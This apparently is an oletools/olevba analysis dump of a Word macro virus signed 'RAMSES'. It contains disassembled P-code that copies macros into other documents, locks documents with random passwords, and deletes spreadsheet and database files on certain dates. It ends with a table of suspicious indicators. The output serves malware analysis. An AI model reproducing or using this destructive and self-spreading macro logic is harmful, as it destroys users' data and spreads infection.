' 	ArgsMemLd [Left$] 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd Val 0x0001 
' 	LitDI4 0xB400 0x0000 
' 	Gt 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #77:
' 	LitStr 0x0000 ""
' 	St w$ 
' Line #78:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000F 
' 	For 
' Line #79:
' 	Ld w$ 
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x005A 
' 	Mul 
' 	Ld WordBasic 
' 	ArgsMemLd InStrB 0x0001 
' 	LitDI2 0x0021 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St w$ 
' Line #80:
' 	StartForVariable 
' 	Next 
' Line #81:
' 	Ld w$ 
' 	Ld d 
' 	MemSt Password 
' Line #82:
' 	LitDI2 0x0001 
' 	UMi 
' 	St y 
' Line #83:
' 	ElseBlock 
' Line #84:
' 	Ld a 
' 	Not 
' 	IfBlock 
' Line #85:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0008 
' 	For 
' Line #86:
' 	Ld i 
' 	ArgsLd r__$ 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld i 
' 	ArgsLd r__$ 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #87:
' 	StartForVariable 
' 	Next 
' Line #88:
' 	LitDI2 0x0001 
' 	UMi 
' 	St y 
' Line #89:
' 	EndIfBlock 
' Line #90:
' 	EndIfBlock 
' Line #91:
' 	Ld y 
' 	LitDI2 0x0001 
' 	UMi 
' 	Eq 
' 	IfBlock 
' Line #92:
' 	Ld d 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #93:
' 	EndIfBlock 
' Line #94:
' 	EndIfBlock 
' Line #95:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Day 0x0001 
' 	LitDI2 0x0016 
' 	Eq 
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Month 0x0001 
' 	LitDI2 0x0002 
' 	Mod 
' 	Paren 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #96:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x0005 
' 	Mul 
' 	Ld WordBasic 
' 	ArgsMemLd InStrB 0x0001 
' 	St i 
' Line #97:
' 	Ld i 
' 	SelectCase 
' Line #98:
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' Line #99:
' 	LitStr 0x0005 "*.xl*"
' 	St h$ 
' Line #100:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #101:
' 	LitStr 0x0005 "*.dbf"
' 	St h$ 
' Line #102:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #103:
' 	LitStr 0x0005 "*.wk*"
' 	St h$ 
' Line #104:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' Line #105:
' 	LitStr 0x0005 "*.mdb"
' 	St h$ 
' Line #106:
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' Line #107:
' 	LitStr 0x0005 "*.ptt"
' 	St h$ 
' Line #108:
' 	EndSelect 
' Line #109:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitDI2 0x0003 
' 	Ld WordBasic 
' 	ArgsMemLd [Left$] 0x0002 
' 	St w$ 
' Line #110:
' 	Ld w$ 
' 	ParamNamed SearchPath 
' 	Ld h$ 
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed SubDir 
' 	Ld WordBasic 
' 	ArgsMemCall FileFind 0x0003 
' Line #111:
' 	Ld WordBasic 
' 	ArgsMemLd CountFoundFiles 0x0000 
' 	LitDI2 0x0001 
' 	Sub 
' 	St k 
' Line #112:
' 	Ld k 
' 	LitDI2 0x0000 
' 	Ge 
' 	IfBlock 
' Line #113:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld k 
' 	For 
' Line #114:
' 	Ld y 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemLd [FoundFileName$] 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall Kill 0x0001 
' Line #115:
' 	StartForVariable 
' 	Next 
' Line #116:
' 	EndIfBlock 
' Line #117:
' 	LineCont 0x0008 0A 00 00 00 16 00 00 00
' 	LitStr 0x002C "La maledizione del Faraone ricada su di te !"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0022 "              Il Figlio della Luce"
' 	Add 
' 	LitStr 0x0006 "RAMSES"
' 	LitDI2 0x0030 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0003 
' Line #118:
' 	EndIfBlock 
' Line #119:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableInput 0x0001 
' Line #120:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall ScreenUpdating 0x0001 
' Line #121:
' 	EndSub 
' Line #122:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

